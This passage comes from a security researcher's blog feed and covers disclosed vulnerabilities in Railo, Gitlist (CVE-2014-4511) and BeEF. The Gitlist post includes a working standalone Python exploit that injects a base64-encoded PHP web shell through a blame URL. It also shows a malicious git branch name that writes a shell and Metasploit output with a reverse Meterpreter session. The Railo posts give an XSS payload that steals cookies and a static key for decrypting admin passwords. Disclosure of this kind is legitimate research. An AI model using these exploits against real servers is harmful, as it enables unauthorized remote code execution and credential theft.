</span><span class='line'>&lt;th&gt;Time&lt;/th&gt;
</span><span class='line'>&lt;th&gt;Thread&lt;/th&gt;
</span><span class='line'>&lt;th&gt;Level&lt;/th&gt;
</span><span class='line'>&lt;th&gt;Category&lt;/th&gt;
</span><span class='line'>&lt;th&gt;Message&lt;/th&gt;
</span><span class='line'>&lt;/tr&gt;
</span><span class='line'>&lt;/table&gt;
</span><span class='line'>&lt;br&gt;
</span><span class='line'>&lt;/body&gt;&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>Note our title contains the injected command.  Here&rsquo;s execution:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-log-inject-execution.jpg"></p>

<p>Using this method we can, again, inject a shell without requiring the use of any reverse connections, though that option is of course available with the help of the <code>cfhttp</code> tag.</p>

<p>Another fun post-authentication <em>feature</em> is the use of data sources.  In Railo, you can craft a custom data source, which is a user-defined database abstraction that can be used as a filesystem.  Here&rsquo;s the definition of a MySQL data source:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-datasource-def.jpg"></p>

<p>With this defined, we can set all client session data to be stored in the database, allowing us to harvest session ID&rsquo;s and plaintext credentials (see part one).  Once the session storage is set to the created database, a new table will be created (cf_session_data) that will contain all relevant session information, including symmetrically-encrypted passwords.</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-database-session-info.jpg"></p>

<p>Part three and four of this series will begin to dive into the good stuff, where we&rsquo;ll discuss several pre-authentication vulnerabilities that we can use to obtain credentials and remote code execution on a Railo host.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[gitlist - commit to rce]]></title>
    <link href="http://hatRiot.github.io/blog/2014/06/29/gitlist-rce/"/>
    <updated>2014-06-29T15:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/06/29/gitlist-rce</id>
    <content type="html"><![CDATA[<p><a href="http://gitlist.org/">Gitlist</a> is a fantastic repository viewer for Git; it&rsquo;s essentially your own private Github without all the social networking and glitzy features of it.  I&rsquo;ve got a private Gitlist that I run locally, as well as a professional instance for hosting internal projects.  Last year I noticed a bug listed on their Github page that looked a lot like an exploitable <a href="https://github.com/klaussilveira/gitlist/issues/395">hole</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Oops! sh: 1: Syntax error: EOF in backquote substitution</span></code></pre></td></tr></table></div></figure>


<p>I commented on its exploitability at the time, and though the hole appears to be closed, the issue still remains.  I returned to this during an install of Gitlist and decided to see if there were any other bugs in the application and, as it turns out, there are a few.  I discovered a handful of bugs during my short hunt that I&rsquo;ll document here, including one anonymous remote code execution vulnerability that&rsquo;s quite trivial to pop.  These bugs were reported to the developers and CVE-2014-4511 was assigned.  These issues were fixed in version 0.5.0.</p>

<p>The first bug is actually more of a vulnerability in a library Gitlist uses, Gitter (same developers).  Gitter allows developers to interact with Git repositories using Object-Oriented Programming (OOP).  During a quick once-over of the code, I noticed the library shelled out quite a few times, and one in particular stood out to me:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$hash = $this-&gt;getClient()-&gt;run($this, "log --pretty=\"%T\" --max-count=1 $branch");```</span></code></pre></td></tr></table></div></figure>


<p>This can be found in <code>Repository.php</code> of the Gitter library, and is invoked from <code>TreeController.php</code> in Gitlist.  As you can imagine, there is no sanitization on the <code>$branch</code> variable.  This essentially means that anyone with commit access to the repository can create a malicious branch name (locally or remotely) and end up executing arbitrary commands on the server.</p>

<p>The tricky part comes with the branch name; git actually has a couple restrictions on what can and cannot be part of a branch name.  This is all defined and checked inside of <a href="https://github.com/git/git/blob/cb682f8cfe63ecd0da08a526f404d295e51e3ab1/refs.c">refs.c</a>, and the rules are simply defined as (starting at line 33):</p>

<ol>
<li>Cannot begin with .</li>
<li>Cannot have a double dot (..)</li>
<li>Cannot contain ASCII control characters (?, [, ], ~, ^, :, \)</li>
<li>End with /</li>
<li>End with .lock</li>
<li>Contain a backslash</li>
<li>Cannot contain a space</li>
</ol>


<p>With these restrictions in mind, we can begin crafting our payload.</p>

<p>My first thought was, because Gitlist is written in PHP, to drop a web shell.  To do so we must print our payload out to a file in a location accessible to the web root.  As it so happens, we have just the spot to do it.  According to INSTALL.md, the following is required:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /var/www/gitlist
</span><span class='line'>mkdir cache
</span><span class='line'>chmod 777 cache</span></code></pre></td></tr></table></div></figure>


<p>This is perfect; we have a <em>reliable</em> location with 777 permissions and it&rsquo;s accessible from the web root (/gitlist/cache/my_shell.php).  Second step is to come up with a payload that adheres to the Git branch rules while still giving us a shell.  What I came up with is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># git checkout -b "|echo\$IFS\"PD9zeXN0ZW0oJF9SRVFVRVNUWyd4J10pOz8+Cg==\"|base64\$IFS-d&gt;/var/www/gitlist/cache/x"</span></code></pre></td></tr></table></div></figure>


<p>In order to inject PHP, we need the &lt;? and ?> headers, so we need to encode our PHP payload.  We use the $IFS environment variable (Internal Field Separator) to plug in our spaces and echo the base64&rsquo;d shell into <code>base64</code> for decoding, then pipe that into our payload location.</p>

<p>And it works flawlessly.</p>

<p>Though you might say, &ldquo;Hey if you have commit access it&rsquo;s game over&rdquo;, but I&rsquo;ve seen several instances of this not being the case.  Commit access does not necessarily equate to shell access.</p>

<p>The second vulnerability I discovered was a trivial RCE, exploitable by anonymous users without any access.  I first noticed the bug while browsing the source code, and ran into this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$blames = $repository-&gt;getBlame("$branch -- \"$file\"");</span></code></pre></td></tr></table></div></figure>


<p>Knowing how often they shell out, and the complete lack of input sanitization, I attempted to pop this by trivially evading the double quotes and injecting grave accents:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://localhost/gitlist/my_repo.git/blame/master/""`whoami`</span></code></pre></td></tr></table></div></figure>


<p>And what do you know?</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/gitlist_rce1.jpg"></p>

<p>Curiousity quickly overcame me, and I attempted another vector:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/gitlist_rce2.jpg"></p>

<p>Faster my fingers flew:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/gitlist_rce3.jpg"></p>

<p>It&rsquo;s terrifyingly clear that <em>everything</em> is an RCE.  I developed a rough PoC to drop a web shell on the system.  A test run of this is below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@droot:~/exploits# python gitlist_rce.py http://192.168.1.67/gitlist/graymatter
</span><span class='line'>[!] Using cache location /var/www/gitlist/cache
</span><span class='line'>[!] Shell dropped; go hit http://192.168.1.67/gitlist/cache/x.php?cmd=ls
</span><span class='line'>root@droot:~/exploits# curl http://192.168.1.67/gitlist/cache/x.php?cmd=id
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>root@droot:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve also developed a Metasploit module for this issue, which I&rsquo;ll be submitting a PR for soon.  A run of it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(gitlist_rce) &gt; rexploit
</span><span class='line'>[*] Reloading module...
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.1.6:4444 
</span><span class='line'>[*] Injecting payload...
</span><span class='line'>[*] Executing payload..
</span><span class='line'>[*] Sending stage (39848 bytes) to 192.168.1.67
</span><span class='line'>[*] Meterpreter session 9 opened (192.168.1.6:4444 -&gt; 192.168.1.67:34241) at 2014-06-21 23:07:01 -0600
</span><span class='line'>
</span><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer    : bryan-VirtualBox
</span><span class='line'>OS          : Linux bryan-VirtualBox 3.2.0-63-generic #95-Ubuntu SMP Thu May 15 23:06:36 UTC 2014 i686
</span><span class='line'>Meterpreter : php/php
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<p>Source for the standalone Python exploit can be found below.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from commands import getoutput
</span><span class='line'>import urllib
</span><span class='line'>import sys
</span><span class='line'>
</span><span class='line'>""" 
</span><span class='line'>Exploit Title: Gitlist &lt;= 0.4.0 anonymous RCE
</span><span class='line'>Date: 06/20/2014
</span><span class='line'>Author: drone (@dronesec)
</span><span class='line'>Vendor Homepage: http://gitlist.org/
</span><span class='line'>Software link: https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz
</span><span class='line'>Version: &lt;= 0.4.0
</span><span class='line'>Tested on: Debian 7
</span><span class='line'>More information: 
</span><span class='line'>cve: CVE-2014-4511
</span><span class='line'>"""
</span><span class='line'>
</span><span class='line'>if len(sys.argv) &lt;= 1:
</span><span class='line'>    print '%s: [url to git repo] {cache path}' % sys.argv[0]
</span><span class='line'>    print '  Example: python %s http://localhost/gitlist/my_repo.git' % sys.argv[0]
</span><span class='line'>    print '  Example: python %s http://localhost/gitlist/my_repo.git /var/www/git/cache' % sys.argv[0]
</span><span class='line'>    sys.exit(1)
</span><span class='line'>
</span><span class='line'>url = sys.argv[1]
</span><span class='line'>url = url if url[-1] != '/' else url[:-1]
</span><span class='line'>
</span><span class='line'>path = "/var/www/gitlist/cache"
</span><span class='line'>if len(sys.argv) &gt; 2:
</span><span class='line'>    path = sys.argv[2]
</span><span class='line'>
</span><span class='line'>print '[!] Using cache location %s' % path
</span><span class='line'>
</span><span class='line'># payload &lt;?system($_GET['cmd']);?&gt;
</span><span class='line'>payload = "PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo="
</span><span class='line'>
</span><span class='line'># sploit; python requests does not like this URL, hence wget is used
</span><span class='line'>mpath = '/blame/master/""`echo {0}|base64 -d &gt; {1}/x.php`'.format(payload, path)
</span><span class='line'>mpath = url+ urllib.quote(mpath)
</span><span class='line'>
</span><span class='line'>out = getoutput("wget %s" % mpath)
</span><span class='line'>if '500' in out:
</span><span class='line'>    print '[!] Shell dropped; go hit %s/cache/x.php?cmd=ls' % url.rsplit('/', 1)[0]
</span><span class='line'>else:
</span><span class='line'>    print '[-] Failed to drop'
</span><span class='line'>    print out</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[railo security - part one - intro]]></title>
    <link href="http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one/"/>
    <updated>2014-06-25T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one</id>
    <content type="html"><![CDATA[<p><em>Part one &ndash; intro</em><br/>
<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>

<p><a href="http://getrailo.org/">Railo</a> is an open-source alternative to the popular Coldfusion application server, implementing a FOSSy CFML engine and application server.  It emulates Coldfusion in a variety of ways, mainly features coming straight from the CF world, along with several of it&rsquo;s own unique features (clustered servers, a plugin architecture, etc).  In this four-part series, we&rsquo;ll touch on how Railo, much like Coldfusion, can be used to gain access to a system or network of systems.  I will also be examining several pre-authentication RCE vulnerabilities discovered in the platform during this audit.  I&rsquo;ll be pimping <a href="https://github.com/hatRiot/clusterd">clusterd</a> throughout to exemplify how it can help achieve some of these goals.  These posts are the result of a combined effort between myself and Stephen Breen (@breenmachine).</p>

<p>I&rsquo;ll preface this post with a quick rundown on what we&rsquo;re working with; public versions of Railo run from versions 3.0 to 4.2, with 4.2.1 being the latest release as of posting.  The code is also freely available on <a href="github.com/getrailo/railo">Github</a>; much of this post&rsquo;s code samples have been taken from the 4.2 branch or the master.  Hashes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ git branch
</span><span class='line'>* master
</span><span class='line'>$ git rev-parse master
</span><span class='line'>694e8acf1a762431eab084da762a0abbe5290f49</span></code></pre></td></tr></table></div></figure>


<p>And a quick rundown of the code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cloc ./
</span><span class='line'>    3689 text files.
</span><span class='line'>    3571 unique files.                                          
</span><span class='line'>     151 files ignored.
</span><span class='line'>
</span><span class='line'>http://cloc.sourceforge.net v 1.60  T=7.74 s (452.6 files/s, 60622.4 lines/s)
</span><span class='line'>---------------------------------------------------------------------------------
</span><span class='line'>Language                       files          blank        comment           code
</span><span class='line'>---------------------------------------------------------------------------------
</span><span class='line'>Java                            2786          66639          69647         258015
</span><span class='line'>ColdFusion                       315           5690           3089          35890
</span><span class='line'>ColdFusion CFScript              352           4377            643          15856
</span><span class='line'>XML                               22            526            563           5773
</span><span class='line'>Javascript                        14             46            252            733
</span><span class='line'>Ant                                4             38             70            176
</span><span class='line'>DTD                                4            283            588            131
</span><span class='line'>CSS                                5             52             16             77
</span><span class='line'>HTML                               1              0              0              1
</span><span class='line'>---------------------------------------------------------------------------------
</span><span class='line'>SUM:                            3503          77651          74868         316652
</span><span class='line'>---------------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>


<p>Railo has two separate administrative web interfaces; server and web.  The two interfaces segregate functionality out into these categories; managing the actual server and managing the content served up by the server.  Server is available at <code>http://localhost:8888/railo-context/admin/server.cfm</code> and web is available at <code>http://localhost:8888/railo-context/admin/web.cfm</code>.  Both interfaces are configured with a single, shared password that is set AFTER the site has been initialized.  That is, the first person to hit the web server gets to choose the password.</p>

<h4>Authentication</h4>

<p>As stated, authentication requires only a single password, but locks an IP address out if too many failed attempts are performed.  The exact logic for this is as follows (<code>web.cfm</code>):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif loginPause and StructKeyExists(application,'lastTryToLogin') and IsDate(application.lastTryToLogin) and DateDiff("s",application.lastTryToLogin,now()) LT loginPause&gt;
</span><span class='line'>        &lt;cfset login_error="Login disabled until #lsDateFormat(DateAdd("s",loginPause,application.lastTryToLogin))# #lsTimeFormat(DateAdd("s",loginPause,application.lastTryToLogin),'hh:mm:ss')#"&gt;
</span><span class='line'>    &lt;cfelse&gt;</span></code></pre></td></tr></table></div></figure>


<p>A <code>Remember Me For</code> setting allows an authenticated session to last until logout or for a specified amount of time.  In the event that a cookie is saved for X amount of time, Railo actually encrypts the user&rsquo;s password and stores it as the authentication cookie.  Here&rsquo;s the implementation of this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfcookie expires="#DateAdd(form.rememberMe,1,now())#" name="railo_admin_pw_#ad#" value="#Encrypt(form["login_password"&ad],cookieKey,"CFMX_COMPAT","hex")#"&gt;</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s right; a static key, defined as <code>&lt;cfset cookieKey="sdfsdf789sdfsd"&gt;</code>, is used as the key to the CFMX_COMPAT encryption algorithm for encrypting and storing the user&rsquo;s password client-side.  This is akin to simply base64&#8217;ing the password, as symmetric key security is dependant upon the secrecy of this shared key.</p>

<p>To then verify authentication, the cookie is decrypted and compared to the current password (which is also known; more on this later):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif not StructKeyExists(session,"password"&request.adminType) and StructKeyExists(cookie,'railo_admin_pw_#ad#')&gt;
</span><span class='line'>    &lt;cfset fromCookie=true&gt;
</span><span class='line'>    &lt;cftry&gt;
</span><span class='line'>        &lt;cfset session["password"&ad]=Decrypt(cookie['railo_admin_pw_#ad#'],cookieKey,"CFMX_COMPAT","hex")&gt;
</span><span class='line'>        &lt;cfcatch&gt;&lt;/cfcatch&gt;
</span><span class='line'>    &lt;/cftry&gt;
</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>


<p>For example, if my stored cookie was <code>RAILO_ADMIN_PW_WEB=6802AABFAA87A7</code>, we could decrypt this with a simple CFML page:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset tmp=Decrypt("6802AABFAA87A7", "sdfsdf789sdfsd", "CFMX_COMPAT", "hex")&gt;
</span><span class='line'>&lt;cfdump var="#tmp#"&gt;</span></code></pre></td></tr></table></div></figure>


<p>This would dump my plaintext password (which, in this case, is &ldquo;default&rdquo;).  This ups the ante with XSS, as we can essentially steal plaintext credentials via this vector.  Our cookie is graciously set without HTTPOnly or Secure: <code>Set-Cookie: RAILO_ADMIN_PW_WEB=6802AABFAA87A7;Path=/;Expires=Sun, 08-Mar-2015 06:42:31 GMT</code>._</p>

<p>Another worthy mention is the fact that the plaintext password is stored in the session struct, as shown below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset session["password"&request.adminType]=form["login_password"&request.adminType]&gt;</span></code></pre></td></tr></table></div></figure>


<p>In order to dump this, however, we&rsquo;d need to be able to write a CFM file (or code) within the context of web.cfm.  As a test, I&rsquo;ve placed a short CFM file on the host and set the error handler to invoke it.  <code>test.cfm</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfdump var="#session#"&gt;</span></code></pre></td></tr></table></div></figure>


<p>We then set the template handler to this file:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-error-handler.jpg"></p>

<p>If we now hit a non-existent page, <code>/railo-context/xx.cfm</code> for example, we&rsquo;ll trigger the cfm and get our plaintext password:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-session-plaintext.jpg"></p>

<h4>XSS</h4>

<p>XSS is now awesome, because we can fetch the server&rsquo;s plaintext password.  Is there XSS in Railo?</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xss.jpg"></p>

<p>Submitting to a CFM with malicious arguments triggers an error and injects unsanitized input.</p>

<p>Post-authentication search:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xss2.jpg"></p>

<p>Submitting malicious input into the search bar will effectively sanitize out greater than/less than signs, but not inside of the saved form.  Injecting <code>"&gt;&lt;/form&gt;&lt;img src=x onerror=alert(document.cookie)&gt;</code> will, of course, pop-up the cookie.</p>

<p>How about stored XSS?</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xss3.jpg"></p>

<p>A malicious mapping will trigger whenever the page is loaded; the only caveat being that the path must start with a /, and you cannot use the script tag.  Trivial to get around with any number of different tags.</p>

<p>Speaking of, let&rsquo;s take a quick look at the sanitization routines.  They&rsquo;ve implemented their own routines inside of <code>ScriptProtect.java</code>, and it&rsquo;s a very simple blacklist:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  public static final String[] invalids=new String[]{
</span><span class='line'>        "object", "embed", "script", "applet", "meta", "iframe"
</span><span class='line'>    };</span></code></pre></td></tr></table></div></figure>


<p>They iterate over these values and perform a simple compare, and if a <em>bad</em> tag is found, they simply replace it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(compareTagName(tagName)) {
</span><span class='line'>            if(sb==null) {
</span><span class='line'>                sb=new StringBuffer();
</span><span class='line'>                last=0;
</span><span class='line'>            }
</span><span class='line'>            sb.append(str.substring(last,index+1));
</span><span class='line'>            sb.append("invalidTag");
</span><span class='line'>            last=endIndex;
</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>


<p>It doesn&rsquo;t take much to evade this filter, as I&rsquo;ve already described.</p>

<p>CSRF kinda fits in here, how about CSRF?  Fortunately for users, and unfortunately for pentesters, there&rsquo;s not much we can do.  Although Railo does not enforce authentication for CFML/CFC pages, it does check read/write permissions on all accesses to the backend config file.  This is configured in the Server interface:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-server-pw.jpg"></p>

<p>In the above image, if <code>Access Write</code> was configured to <code>open</code>, any user could submit modifications to the back-end configuration, including password resets, task scheduling, and more.  Though this is sufficiently locked down by default, this could provide a nice backdoor.</p>

<h4>Deploying</h4>

<p>Much like Coldfusion, Railo features a task scheduler that can be used to deploy shells.  A run of this in clusterd can be seen below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i192.168.1.219 -a railo -v4.1 --deploy ./src/lib/resources/cmd.cfml --deployer task --usr-auth default
</span><span class='line'>
</span><span class='line'>        clusterd/0.2.1 - clustered attack toolkit
</span><span class='line'>            [Supporting 6 platforms]
</span><span class='line'>
</span><span class='line'> [2014-05-01 10:04PM] Started at 2014-05-01 10:04PM
</span><span class='line'> [2014-05-01 10:04PM] Servers' OS hinted at windows
</span><span class='line'> [2014-05-01 10:04PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-05-01 10:04PM] Server hinted at 'railo'
</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server...
</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server Administrator...
</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Web Administrator...
</span><span class='line'> [2014-05-01 10:04PM] Matched 3 fingerprints for service railo
</span><span class='line'> [2014-05-01 10:04PM]   Railo Server (version 4.1)
</span><span class='line'> [2014-05-01 10:04PM]   Railo Server Administrator (version 4.1)
</span><span class='line'> [2014-05-01 10:04PM]   Railo Web Administrator (version 4.1)
</span><span class='line'> [2014-05-01 10:04PM] Fingerprinting completed.
</span><span class='line'> [2014-05-01 10:04PM] This deployer (schedule_task) requires an external listening port (8000).  Continue? [Y/n] &gt; 
</span><span class='line'> [2014-05-01 10:04PM] Preparing to deploy cmd.cfml..
</span><span class='line'> [2014-05-01 10:04PM] Creating scheduled task...
</span><span class='line'> [2014-05-01 10:04PM] Task cmd.cfml created, invoking...
</span><span class='line'> [2014-05-01 10:04PM] Waiting for remote server to download file [8s]]
</span><span class='line'> [2014-05-01 10:04PM] cmd.cfml deployed to /cmd.cfml
</span><span class='line'> [2014-05-01 10:04PM] Cleaning up...
</span><span class='line'> [2014-05-01 10:04PM] Finished at 2014-05-01 10:04PM</span></code></pre></td></tr></table></div></figure>


<p>This works almost identically to the Coldfusion scheduler, and should not be surprising.</p>

<p>One feature Railo has that isn&rsquo;t found in Coldfusion is the Extension or Plugin architecture; this allows custom extensions to run in the context of the Railo server and execute code and tags.  These extensions do not have access to the cfadmin tag (without authentication, that is), but we really don&rsquo;t need that for a simple web shell.  In the event that the Railo server is configured to not allow outbound traffic (hence rendering the Task Scheduler useless), this could be harnessed instead.</p>

<p>Railo allows extensions to be uploaded directly to the server, found here:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-plugin-upload.jpg"></p>

<p>Developing a plugin is sort of confusing and not exacty clear via their provided Github documentation, however the simplest way to do this is grab a pre-existing package and simply replace one of the functions with a shell.</p>

<p>That about wraps up part one of our dive into Railo security; the remaining three parts will focus on several different vulnerabilities in the Railo framework, and how they can be lassoed together for pre-authentication RCE.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[rce in browser exploitation framework (BeEF)]]></title>
    <link href="http://hatRiot.github.io/blog/2014/05/13/rce-in-browser-exploitation-framework-beef/"/>
    <updated>2014-05-13T19:57:53-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/05/13/rce-in-browser-exploitation-framework-beef</id>
    <content type="html"><![CDATA[<p>Let me preface this post by saying that this vulnerability is <em>already fixed</em>, and was caught pretty early during the development process.  The vulnerability was originally introduced during a merge for the new DNS extension, and was promptly <a href="https://github.com/beefproject/beef/commit/39e672f4207aa46c4c0c11e0ce21cbaa3ab45d71">patched</a> by antisnatchor on 03022014.  Although this vulnerability was caught fairly quickly, it still made it into the master branch.  I post this only because I&rsquo;ve seen too many penetration testers leaving their tools externally exposed, often with default credentials.</p>

<p>The vulnerability is a trivial one, but is capable of returning a reverse shell to an attacker.  BeEF exposes a REST API for modules and scripts to use; useful for dumping statistics, pinging hooked browsers, and more.  It&rsquo;s quite powerful.   This can be accessed by simply pinging <code>http://127.0.0.1:3000/api/</code> and providing a valid token.  This token is static across a single session, and can be obtained by sending a POST to <code>http://127.0.0.1:3000/api/admin/login</code> with appropriate credentials.  Default credentials are beef:beef, and I don&rsquo;t know many users that change this right away.  It&rsquo;s also of interest to note that the throttling code does not exist in the API login routine, so a brute force attack is possible here.</p>

